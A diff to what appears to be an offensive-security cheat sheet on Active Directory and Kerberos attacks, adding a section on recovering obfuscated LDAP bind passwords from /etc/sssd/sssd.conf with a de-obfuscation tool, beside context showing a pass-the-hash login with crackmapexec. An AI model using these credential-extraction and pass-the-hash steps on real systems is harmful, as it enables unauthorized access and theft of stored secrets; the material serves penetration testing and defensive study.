@@ -143,6 +143,7 @@
     - [CCACHE ticket reuse from SSSD KCM](#ccache-ticket-reuse-from-sssd-kcm)
     - [CCACHE ticket reuse from keytab](#ccache-ticket-reuse-from-keytab)
     - [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etckrb5keytab)
+    - [Extract accounts from /etc/sssd/sssd.conf](#extract-accounts-from-etcsssdsssdconf)
   - [References](#references)
 
 ## Tools
@@ -4275,6 +4276,33 @@ Connect to the machine using the account and the hash with CME.
 $ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
 CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
 ```
+
+
+## Extract accounts from /etc/sssd/sssd.conf
+
+> sss_obfuscate converts a given password into human-unreadable format and places it into appropriate domain section of the SSSD config file, usually located at /etc/sssd/sssd.conf
+
+The obfuscated password is put into "ldap_default_authtok" parameter of a given SSSD domain and the "ldap_default_authtok_type" parameter is set to "obfuscated_password". 
+
+```ini
+[sssd]
+config_file_version = 2
+...
+[domain/LDAP]
+...
+ldap_uri = ldap://127.0.0.1
+ldap_search_base = ou=People,dc=srv,dc=world
+ldap_default_authtok_type = obfuscated_password
+ldap_default_authtok = [BASE64_ENCODED_TOKEN]
+```
+
+De-obfuscate the content of the ldap_default_authtok variable with [mludvig/sss_deobfuscate](https://github.com/mludvig/sss_deobfuscate)
+
+```ps1
+./sss_deobfuscate [ldap_default_authtok_base64_encoded]
+./sss_deobfuscate AAAQABagVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID
+```
+
 
 ## References
 
